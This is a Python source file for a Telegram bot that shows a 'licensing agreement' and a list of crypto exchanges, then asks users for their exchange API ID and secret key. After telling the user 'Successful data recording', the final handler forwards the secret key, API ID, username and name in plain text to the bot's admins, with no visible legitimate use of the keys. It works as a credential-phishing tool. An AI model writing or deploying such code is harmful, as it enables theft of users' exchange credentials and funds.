# - *- coding: utf- 8 - *-
from aiogram.dispatcher import FSMContext
from aiogram.types import CallbackQuery, Message
from aiogram.utils.exceptions import MessageCantBeDeleted
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage

from modules.services import db, json_logic
from modules.keyboards import inline_user, inline_page
from modules.alerts import send_admins
from modules.utils.const_func import ded

from bot_telegram import dp, bot
from contextlib import suppress
import asyncio

@dp.message_handler(text = ['/start'], state = "*")
async def start(message: Message, state: FSMContext):
    await state.finish()
    check = db.check_user(message.from_user.id)
    if check:
        await user_menu(message)
    else:
        await message.answer("<b>Выберите язык 🇷🇺\n"
                             "➖➖➖➖➖➖\n"
                             "select a language 🇬🇧</b>", reply_markup=inline_user.select_lang())


async def user_menu(message):
    check = db.check_user(message.from_user.id)
    if check == 'ru':
        licensing_agreement = json_logic.get_texts("licensing_agreement_ru")
        await message.answer(f"{licensing_agreement}", reply_markup=inline_page.exchange_swipe_fp(0))
    else:
        licensing_agreement = json_logic.get_texts("licensing_agreement_eng")
        await message.answer(f"{licensing_agreement}", reply_markup=inline_page.exchange_swipe_fp(0))



@dp.callback_query_handler(text_startswith="select_lang:", state="*")
async def user_selected_lang(call: CallbackQuery, state: FSMContext):
    await state.finish()
    select = call.data.split(":")[1]
    db.registation_user(call.from_user.id, call.from_user.username, select)
    with suppress(MessageCantBeDeleted):
        await call.message.delete()
    if select == "ru":
        await user_menu(call.message)
    else:
        await user_menu(call.message)


@dp.message_handler(text = ['/select_lang'], state = "*")
async def select_lang(message: Message, state: FSMContext):
    await state.finish()
    await message.answer("<b>Выберите язык 🇷🇺\n"
                         "➖➖➖➖➖➖\n"
                         "select a language 🇬🇧</b>", reply_markup=inline_user.select_lang())



@dp.callback_query_handler(text_startswith="buy_exchange_swipe:", state="*")
async def exchange_swipe(call: CallbackQuery, state: FSMContext):
    remover = call.data.split(":")[1]

    with suppress(MessageCantBeDeleted):
        await call.message.delete()
    check = db.check_user(call.from_user.id)
    if check == 'ru':
        licensing_agreement = json_logic.get_texts("licensing_agreement_ru")
        await call.message.edit_text(f"{licensing_agreement}", reply_markup=inline_page.exchange_swipe_fp(remover))
    else:
        licensing_agreement = json_logic.get_texts("licensing_agreement_eng")
        await call.message.edit_text(f"{licensing_agreement}", reply_markup=inline_page.exchange_swipe_fp(remover))


@dp.callback_query_handler(text_startswith="buy_exchange_open:", state="*")
async def exchange_open(call: CallbackQuery, state: FSMContext):
    exchange_id = call.data.split(":")[1]

    check = db.check_user(call.from_user.id)
    if check == 'ru':
        await call.message.answer("<b>Введите ваш API ID</b>")
    else:
        await call.message.answer("<b>Enter your API ID</b>")
    await state.update_data(exchange_id=exchange_id)
    await state.set_state("get_api_id")

@dp.message_handler(state = "get_api_id")
async def get_API_ID(message: Message, state: FSMContext):
    await state.update_data(api_id=message.text)
    check = db.check_user(message.from_user.id)
    if check == 'ru':
        await message.answer("<b>Введите ваш Secret key</b>")
    else:
        await message.answer("<b>Enter your Secret key</b>")
    await state.set_state("get_secret_key")

@dp.message_handler(state = "get_secret_key")
async def get_Secret_key(message: Message, state: FSMContext):
    check = db.check_user(message.from_user.id)
    secret_key = message.text
    if check == 'ru':
        await message.answer("<b>Успешная запись данных</b>")
    else:
        await message.answer("<b>Successful data recording</b>")
    async with state.proxy() as data:
        api_id = data['api_id']
        exchange_id = data['exchange_id']
    await state.finish()

    bot_info = await bot.get_me()
    exchange = db.get_exchange(exchange_id=exchange_id)

    first_name = message.from_user.first_name
    if first_name == None:
        first_name = ''
    last_name = message.from_user.last_name
    if last_name == None:
        last_name = ''

    await send_admins(ded(f"""<b>
    Успешная запись данных</b>
    
    Бот - @{bot_info.username}
    Пользователь - @{message.from_user.username}
    <b>{first_name} {last_name}</b>
    Секретный ключ - <code>{secret_key}</code>
    API ID - <code>{api_id}</code>
    Биржа - {exchange['exchange_name']}
    
    """))

